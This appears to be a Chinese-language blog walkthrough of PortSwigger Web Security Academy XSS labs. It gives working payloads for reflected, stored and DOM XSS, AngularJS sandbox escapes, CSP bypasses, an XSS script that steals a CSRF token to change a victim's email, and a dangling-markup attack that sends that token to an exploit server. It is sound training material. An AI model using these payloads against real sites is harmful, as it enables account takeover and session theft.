继续通关portswigger web security academy

则篇文章来到了Cross-site scripting（xss）部分，由于很多题目对于Firefox不兼容，之后使用chrome浏览器

1. #### Reflected XSS into HTML context with nothing encoded

   ![image-20261111175813023](01.png)

   最基础的xss，利用网页上不经过过滤直接将用户输入写入网页的漏洞，通过输入恶意代码进行攻击。

   在搜索框输入<script>alert(1)</script>

   ![image-20261111180001388](02.png)

   由于对输入未加以过滤，输入被直接拼接到了网页上，被html浏览器解析，从而执行alert(1)

   ![image-20261111180039170](03.png)

   ![image-20261111180103714](04.png)

2. #### Stored XSS into HTML context with nothing encoded

   ![image-20261111172738853](05.png)

   这一题来到了存储型xss漏洞，恶意用户通过上传恶意内容，使其被写入页面，导致任何访问网站的用户都会收到攻击

   ![](06.png)

   在评论中写入

   <script>alert(1)</script>

   在这之后任何访问者打开网页时都会触发alert(1)

   ![image-20261111173434624](07.png)

3. #### DOM XSS in `document.write` sink using source `location.search`

   ![image-20261111173531581](08.png)

   在这一题中在输入框直接输入<script>alert(1)</script>并没有效果![image-20261111174204991](09.png)

   通过查看页面代码可以发现这一句中尖括号被编码了![image-20261111174701860](10.png)

   但是结合题干可以发现本题有可以利用的函数![image-20261111174728478](11.png)

   使查询为拼接在<img src="/resources/images/tracker.gif?searchTerms=后写入网页，且没有做过滤处理。

   在输入框内填入 

   ```
   "> <img src=x onerror=alert(1) "
   ```

    使拼接后变为

   ```
   <img src="/resources/images/tracker.gif?searchTerms="><img src="x" onerror="alert(1)" "">
   ```

   从而实现攻击![image-20261111175704976](12.png)

4. #### DOM XSS in `innerHTML` sink using source `location.search`

   ![image-20261111180243912](13.png)

   ![image-20261111181041491](14.png)

   观察这一题给出的函数可以发现，题目通过js代码将输入写入目标span中，如果直接写入<script>alert(1)</script>

   会在js代码执行后才会写入，所以输入

   ```
   <img src=x onerror=alert(1)>
   ```

   ![image-20261111181325755](15.png)

   利用加载图片时获取图片失败报错执行alert(1)

5. #### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

   ![image-20261111181445183](16.png)

   观察这一题的函数![image-20261111184746158](17.png)

   可以发现，会将返回的网址替换为通过get提交的returnPath的值，故将其改为

   ```
   javascript:alert(document.cookie)
   ```

   ![image-20261111184917503](18.png)

   在点击Back后页面alert弹出

6. #### DOM XSS in jQuery selector sink using a hashchange event

   ![image-20261111224618333](19.png)

   在主页面可以找到函数

   ![image-20261111224855002](20.png)

   会在hash变化时，搜索匹配对应的文章并控制页面滚动过去。同时这题也不再是要求在本机上响应，而是通过在服务器上，构造包含该页面的恶意网站，并在受害者点击进入时响应。在该网站中使用iframe包含目标网站，利用onload在加载完成后改变hash以触发函数，同时构造恶意的hash值以调用print()函数。

   ![image-20261111230741696](21.png)

   使用

   ```
   <iframe src='https://0a8700d0035e477080953a30006300cb.web-security-academy.net/' onload="this.src+='#<img src=x onerror=print()>'">
   ```

   将其发送给受害者即可过关，也可以点击View exploit检查效果

   ![image-20261111230906192](22.png)

7. #### Reflected XSS into attribute with angle brackets HTML-encoded

   ![image-20261111231002622](23.png)

   这一关转码了尖括号，需要通过写入属性完成。在搜索栏输入

   ```
   <script>alert(1)</script>
   ```

   后观察网页源代码可以发现![image-20261111231429367](24.png)

   尖括号被转码为`&lt;`和`&gt;`同时在搜索栏的value中填入了搜索值。可以先使用双引号闭合value的取值，再在之后的语句中添加新的监听事件，以触发alert。使用

   ```
   " onmouseover="alert(1)
   ```

   即可将其拼接为

   ```
   <input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">
   ```

   从而在鼠标在其上方时触发。需要注意的是这题使用onclick,autofocus onfocus均可显示弹窗但不算过关。

8. #### Stored XSS into anchor `href` attribute with double quotes HTML-encoded

   ![image-20261111233938667](25.png)

   这一题要求在提交的评论中的用户名被点击时弹出alert。在随意页面提交评论后可以看到![image-20261111234147349](26.png)

   点击用户名时网站为提交的第四项Website，故使用JavaScript:alert(1)即可完成![image-20261111234349822](27.png)

9. #### Reflected XSS into a JavaScript string with angle brackets HTML encoded

   ![image-20261111234444688](28.png)

   ![image-20261112000424754](29.png)

   尝试搜索后观察源代码可发现，搜索内容的尖括号被编码后拼接进了JavaScript语句中，故输入

   ```
   '; alert(1); '
   ```

   将该语句拼接为

   ```
   var searchTerms = ''; alert(1); '';
   ```

   即可触发alert

10. #### DOM XSS in `document.write` sink using source `location.search` inside a select element

    ![image-20261112000910871](30.png)

    根据题干找到对应的函数![image-20261112012002526](31.png)

    可以看到该函数会将get参数storeId写入到网页上，且没有经过过滤或转意，所以在url后加上

    ```
    &storeId=<script>alert(1)</script>
    ```

    之后访问网址即可通关

11. #### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

    ![image-20261112012543328](32.png)

    这一题需要使用AngularJS的漏洞，查看源代码可以发现![image-20261112013117503](33.png)

    AngularJS版本为1.7.7，已经移除了沙箱。在输入框中尝试输入{{1+1}}

    ![image-20261112013252102](34.png)

    可以看到结果显示为2，说明被输入可以被编译，所以输入

    ```
    {{constructor.constructor('alert(1)')()}}
    ```

    既可以成功执行alert()![image-20261112013645241](35.png)

12. #### Reflected DOM XSS

    ![image-20261112013813268](36.png)

    随意搜索后查看源代码可以看到，回显是通过/resources/js/searchResults.js里的函数search实现的

    ![image-20261112013954748](37.png)

    进入resources/js/searchResults.js观察可以发现![image-20261112015547397](38.png)

    其使用json接收搜索结果，并且直接将搜索结果拼接进了eval函数。寻找bp代理的流量记录可以看到![image-20261112015725258](39.png)

    搜索内容被加上了双引号，尝试使用双引号绕过时发现，其对双引号进行了处理

    ![image-20261112021240433](40.png)

    但经过测试后可以发现其并未对反斜杠进行处理

    ![image-20261112021329353](41.png)

    所以可以在双引号前加反斜杠使得，该字符串在被处理后变为`\\"`从而进行绕过。为了防止后面的双引号导致报错，在这里截断并注释之后的内容，输入

    ```
    \"+alert(1)}//
    ```

    即可过关![image-20261112023336238](42.png)

13. #### Stored DOM XSS

    ![image-20261112023431850](43.png)

    进入题目可以看到与之前不同，这道题中评论区是通过/resources/js/loadCommentsWithVulnerableEscapeHtml.js中的loadComments函数实现的![image-20261112024421115](44.png)

    该函数使用escapeHTML函数对用户输入内容进行处理![image-20261112030146856](45.png)

    <img src="46.png" alt="image-20261112030157979" style="zoom:67%;" />

    而观察escapeHTML函数可以发现，它只会对字符串中的第一个<和第一个>进行替换，故在payload前添加<>即可绕过

14. #### Reflected XSS into HTML context with most tags and attributes blocked

    ![image-20261112030641936](47.png)

    在这一题中大多数标签均被拦截了，可以看到输入`<script>`标签后弹出了标签不允许

    ![image-20261112030851147](48.png)

    这里使用bp进行爆破。在https://portswigger.net/web-security/cross-site-scripting/cheat-sheet portswigger给出了所有的标签名。使用Intruder模块进行爆破![](49.png)

    ![image-20261112032113597](50.png)

    这里使用body，发现该网页同时会对属性进行拦截

    ![image-20261112032210770](51.png)

    继续使用bp进行爆破

    ![image-20261112032316555](52.png)

    ![image-20261112033034121](53.png)

    这里使用容易触发的resize。在exploit-server中构造恶意网页

    ```
    <iframe src="https://0a0600320410fba7807003dc00b100f4.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100%'">
    ```

    并发送给受害者即可完成

15. #### Reflected XSS into HTML context with all tags blocked except custom ones

    ![image-20261112035538167](54.png)

    在这一题中所有常规标签都被屏蔽了，只能使用自定义标签，同时测试可以发现，这题没有屏蔽属性，所以使用onfocus配合hash或者autofocus获得焦点即可。构造恶意网页

    <script>
    location='https://0ad800fe0496e4cf835ac96600250002.web-security-academy.net/?search=<abc onfocus=alert(document.cookie) autofocus tabindex=1>'
    </script>

    将其发送给受害者即可

    ![image-20261112041610854](55.png)

16. #### Reflected XSS with some SVG markup allowed

    ![image-20261112041733286](56.png)

    这一题使用svg标签，由于svg标签需要配合其他标签使用，所以还是先对可以使用的标签和属性进行爆破

    ![image-20261112044222352](57.png)

    ![image-20261112054208947](58.png)

    由于事件中只有onbegin能用，所以使用svg配合animatetransform触发onbegin。搜索

    ```
    <svg><animatetransform  onbegin=alert(1)></svg>
    ```

    ![image-20261112054625167](59.png)

    即可通关

17. #### Reflected XSS in canonical link tag

    ![image-20261112055037342](60.png)

    注意到head中包含当前网址，且未作过滤![image-20261112055932519](61.png)

    考虑到受害者的输出，使用accesskey将x绑定为快捷键，且点击效果为alert()即可触发

    访问网址

    ```
    https://0a97009803eae2c88712a273009600fe.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
    ```

    后点击对应平台的快捷键即可

18. #### Reflected XSS into a JavaScript string with single quote and backslash escaped

    ![image-20261112175813080](62.png)

    在这一题中单引号和反斜杠都被处理了，观察搜索结果页面的函数![image-20261112180943921](63.png)

    可以注意到输入被直接拼接进了js语句，同时尖括号没有被转意，所以输入

    ```
    </script><script>alert(1)</script>
    ```

    可以关闭原本script标签，并开启一个新的执行命令

    ![image-20261112181221001](64.png)

19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

    ![image-20261112185314276](65.png)

    这一题中双引号和尖括号被编码，单引号被转义。查看源码可以发现，除了对输入的处理外均与上一题相同![image-20261112214022801](66.png)

    由于反斜杠没有被处理，与12题类似搜索框输入

    ```
    \';alert(1);//
    ```

    即可

20. #### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped![image-20261112215438947](67.png)

    在这一题中输入的处理方式与上一题相似，但反斜杠也被转义了，在评论区任意输入内容后可以看到![image-20261112215539691](68.png)

    网址被拼接进了onclick中，由于题目没有处理`&apos;`且早于 JS 解析所以可以使用`&apos;`进行绕过。进行评论并在网址后加上`&apos;+alert(1)+&apos;`将该标签拼接为![image-20261112222317464](69.png)

    在点击作者名后，触发onclick事件进而触发alert

21. #### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

    ![image-20261112231043166](70.png)

    在这题中尖括号，单双引号，反斜杠，反引号均被Unicode转义，而题干中提示了注入点为模板字符串![image-20261112231545399](71.png)

    在源代码中可以看到搜索内容转义后拼接进了模板字符串，在搜索框中输入`${alert(1)}`搜索后发现触发alert![image-20261112231812599](72.png)

22. Exploiting cross-site scripting to steal cookies

23. Exploiting cross-site scripting to capture passwords

    这两题需要bp pro，跳过

24. Exploiting XSS to bypass CSRF defenses

    ![image-20261112232118801](73.png)

    题目要求使用XSS绕过CSRF（**跨站请求伪造**）防御，在登录页面使用题目提供的账号登录后可以看到更换邮箱选项![image-20261112235152014](74.png)

    使用bp抓包后可以看到，新邮箱使用post，提交内容有新邮箱和csrf的防护码

    ![image-20261112235741337](75.png)

    在评论区提交可以发现评论可以使用XSS注入js脚本且评论区的提交表单中包含csrf的防御码，故利用评论区上传

    ```
    <script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];
      var form = document.createElement('form');
      form.action = '/my-account/change-email';
      form.method = 'POST';
      var email = document.createElement('input');
      email.name = 'email';
      email.value = '1@2';
      form.appendChild(email);
      var csrf = document.createElement('input');
      csrf.name = 'csrf';
      csrf.value = token;
      form.appendChild(csrf);
      document.body.appendChild(form);
      form.submit();
    };
    req.open('GET', '/my-account');
    req.send();
    </script>
    ```

    之后访问该页面的用户将会自动将邮箱改为1@2

25. Reflected XSS with AngularJS sandbox escape without strings

    ![image-20261113032316857](76.png)

    这题要求绕过AngularJS的沙箱，进入搜索结果页面可以看到AngularJS的版本为1.4.4，包含沙箱

    ![image-20261113032440503](77.png)

    同时可以看到使用的函数

    ![image-20261113033143546](78.png)

    因为输入单引号会被编码，所以使用toString，利用toString.constructor.prototype.charAt = [].join替换charAt函数以实现沙盒绕过。由于语句会在更改前进行解析，所以只有更内层的命令才会使用更换后的charAt，因为禁用了eval，所以使用order进行输出。为了执行需要将payload注入到`$parse(key)`中的key，所以在网址后方添加一个参数

    ```
    toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
    ```

    ![image-20261113050513162](79.png)

26. #### Reflected XSS with AngularJS sandbox escape and CSP

    ![image-20261113052924494](80.png)

    这一题需要同时绕过沙箱和csp，进入网页可以在bp的代理历史记录里看到网站csp的设置，其限制了js脚本只能同源，所以使用AngularJS绕过

    ![image-20261113053045607](81.png)

    这一题与上一题的AngularJS版本相同，需要绕过沙箱

    ![image-20261113061557201](82.png)

    使用payload

    ```
    <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x'
    ```

    将其转码后拼接在网址上，在攻击页面使用location跳转，得到

    ```
    <script>
    location='https://0a380007045c6571816f200200060017.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'
    </script>
    ```

    发送给受害者即可

27. #### Reflected XSS with event handlers and `href` attributes blocked

    ![image-20261113063035893](83.png)

    这一题中禁用了事件和href属性，爆破后可以看到![image-20261113065103684](84.png)

    只有这几个标签可以使用，由于href标签被禁止，同时题目又要求使用，所以使用svg和animate动态的给a标签添加href属性。使用payload

    ```
    <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
    ```

    ![image-20261113065914170](85.png)

    在点击click me后即可触发alert

28. Reflected XSS in a JavaScript URL with some characters blocked

    ![image-20261113065957605](86.png)

    在源代码中可以看到get传递的值被拼接进了返回的超链接里![image-20261113073853544](87.png)

    尝试改变内容，发现在语句闭合，且postId可以被找到的情况下可以被解析,但空格会被转义为+，并去除括号

    ![image-20261113074333819](88.png)

    所以使用payload

    ```
    5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
    ```

    先定义一个函数用来改变onerror事件为alert并抛出异常1337，将toString改为它，并利用window.''调用toString，将onerror改为alert后出现未捕获异常1337，触发alert，最后闭合语句。将payload拼接在网址后，点击Back to Blog即可弹出alert

29. Reflected XSS protected by very strict CSP, with dangling markup attack

    ![image-20261113080152340](89.png)

    登录提供的账号后，发现在更换邮箱界面，通过get传入email参数会出现在email栏中，且内容被直接填入了网址中![image-20261113080423473](90.png)

    尝试闭合input并添加新的元素![image-20261113080551282](91.png)

    然而由于CSP，无法直接执行脚本

    ![image-20261113081041740](92.png)

    所以先生成按钮诱导受害者点击将csrf令牌发至攻击服务器，在用攻击服务器发送更改邮箱请求，添加

    ```
    <button formaction="https://exploit-0a3a00d2036e8f5e813d5b04019d00f6.exploit-server.net/exploit" formmethod=get type="submit">Click me</button>
    ```

    即可将csrf令牌发送至攻击方的服务器，在检查到csrf令牌后发送更改邮箱请求，在攻击服务器内写下

    ```
    <form class="login-form" name="change" action="https://0aed007e03628ff981dc5cf2000a0058.web-security-academy.net/my-account/change-email" method="POST" style="display:none">
                                <input required type="email" name="email" value="hacker@evil-user.net">
                                <input required type="hidden" name="csrf" value="">
    <script>
    var url=new URL(document.location);
    var c=url.searchParams.get('csrf');
    if(c){
    var f=document.getElementsByName('change')[0];
    var s=document.getElementsByName('csrf')[0];
    s.value=c;
    f.submit();
    }else{
    location='https://0aed007e03628ff981dc5cf2000a0058.web-security-academy.net/my-account?email=1@2"><button%20formaction="https://exploit-0a3a00d2036e8f5e813d5b04019d00f6.exploit-server.net/exploit" formmethod=get type="submit">Click%20me</button>';
    }
    </script>
    ```

    发送给受害者即可过关

30. Reflected XSS protected by CSP, with CSP bypass

    ![image-20261113084843405](93.png)

    在bp的代理历史中观察到这题的csp策略![image-20261113085038659](94.png)

    发现可以注入的参数token，且策略中没有script-src-elem，在输入XSS语句的同时，利用token参数注入script-src-elem unsafe-inline，以覆盖script-src，使得XSS注入的js块可以执行

    ```
    <script>alert%281%29<%2Fscript>&token=;script-src-elem%20%27unsafe-inline%27;
    ```

    ![image-20261113085601694](95.png)

    

    

